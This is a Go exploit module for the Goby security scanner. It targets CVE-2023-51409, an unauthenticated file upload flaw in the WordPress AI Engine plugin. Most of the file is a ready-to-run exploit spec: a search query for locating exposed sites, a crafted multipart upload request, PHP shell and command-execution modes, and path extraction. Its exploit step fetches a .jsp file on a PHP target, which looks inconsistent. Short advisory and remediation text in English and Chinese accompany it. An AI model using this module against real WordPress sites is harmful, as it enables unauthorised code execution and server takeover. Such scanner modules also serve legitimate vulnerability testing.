package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress AI Engine Plugin /wp-json/mwai-ui/v1/files/upload File Upload Vulnerability (CVE-2023-51409)",
    "Description": "<p>The WordPress AI Engine plugin is an AI solution for creating chatbots, generating content, and images. The plugin's upload interface has a file upload vulnerability that allows unauthenticated attackers to upload arbitrary backdoor files and execute malicious code to gain server permissions. Affected versions are version &lt;= 1.9.98.</p>",
    "Product": "WordPress AI Engine Plugin",
    "Homepage": "https://wordpress.org/plugins/ai-engine/",
    "DisclosureDate": "2023-10-01",
    "PostTime": "2024-11-28",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"wp-content/plugins/ai-engine/\" && body=\"wp-block\"",
    "GobyQuery": "body=\"wp-content/plugins/ai-engine/\" && body=\"wp-block\"",
    "Level": "3",
    "Impact": "<p>This vulnerability allows attackers to upload and execute arbitrary code, which may lead to complete server control, data leakage, and system crashes.</p>",
    "Recommendation": "<p>1. Immediately upgrade the WordPress AI Engine plugin to the latest version:<a href=\"https://wordpress.org/plugins/ai-engine/\">https://wordpress.org/plugins/ai-engine/</a></p><p>2. Restrict access to the interface to prevent unauthorized file uploads.</p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/138226326?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/wp-json/mwai-ui/v1/files/upload",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "multipart/form-data; boundary=------------------------8ecd2b831e8d20f4"
                },
                "data_type": "text",
                "data": "--------------------------8ecd2b831e8d20f4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: text/plain\r\n\r\n{{{CONTENT}}}\r\n--------------------------8ecd2b831e8d20f4--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH1|lastbody|regex|wp-content\\\\\\/(.*?)\"",
                "FILE_PATH2|FILE_PATH1|replace_str|\\|",
                "FILE_PATH|define|variable|/wp-content/{{{FILE_PATH2}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        "CVE-2023-51409"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "WordPress AI Engine /wp-json/mwai-ui/v1/files/upload 文件上传漏洞（CVE-2023-51409）",
            "Product": "WordPress AI Engine 插件",
            "Description": "<p>WordPress AI Engine 插件是一个用于创建聊天机器人、生成内容和图像的AI解决方案。该插件的upload接口存在文件上传漏洞，允许未经认证的攻击者上传任意后门文件并执行恶意代码，获取服务器权限。受影响的版本为version &lt;= 1.9.98。</p>",
            "Recommendation": "<p>1. 立即升级 WordPress AI Engine 插件至最新版本:<a href=\"https://wordpress.org/plugins/ai-engine/\">https://wordpress.org/plugins/ai-engine/</a></p><p>2. 限制接口访问权限，防止未经授权的文件上传。</p><p>3. 部署 WAF（Web 应用防火墙）以过滤恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者上传并执行任意代码，可能导致服务器被完全控制，数据泄露和系统崩溃等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "WordPress AI Engine Plugin /wp-json/mwai-ui/v1/files/upload File Upload Vulnerability (CVE-2023-51409)",
            "Product": "WordPress AI Engine Plugin",
            "Description": "<p>The WordPress AI Engine plugin is an AI solution for creating chatbots, generating content, and images. The plugin's upload interface has a file upload vulnerability that allows unauthenticated attackers to upload arbitrary backdoor files and execute malicious code to gain server permissions. Affected versions are version &lt;= 1.9.98.</p>",
            "Recommendation": "<p>1. Immediately upgrade the WordPress AI Engine plugin to the latest version:<a href=\"https://wordpress.org/plugins/ai-engine/\">https://wordpress.org/plugins/ai-engine/</a></p><p>2. Restrict access to the interface to prevent unauthorized file uploads.</p><p>3. Deploy a Web Application Firewall (WAF) to filter malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to upload and execute arbitrary code, which may lead to complete server control, data leakage, and system crashes.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "WordPress AI Engine Plugin"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/wp-json/mwai-ui/v1/files/upload"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
